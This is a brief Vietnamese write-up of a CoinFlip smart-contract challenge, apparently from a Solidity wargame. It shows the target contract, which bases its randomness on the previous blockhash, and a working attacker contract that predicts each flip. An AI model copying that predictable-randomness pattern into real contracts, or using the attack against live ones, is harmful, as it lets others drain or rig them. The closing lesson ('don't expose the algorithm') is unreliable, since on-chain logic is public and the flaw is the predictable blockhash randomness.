### Kết luận
- Không nên để lộ thuật toán của Contract vì kẻ tấn công sẽ có thể tạo contract giải mã các thuật toán đó.
### Contract FlipHack
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface ICoinFlip{
    function flip(bool _guess) external returns (bool);
}
contract FlipAttack{
    ICoinFlip public FlipChallenge;
    constructor(address _challengeAddress){
        FlipChallenge = ICoinFlip(_challengeAddress);
    }
    function predictAttack() external payable{
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;
        bool success = FlipChallenge.flip(side);
        require(success, "Flip that bai");

    }
}
```
### Contract CoinFlip
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```
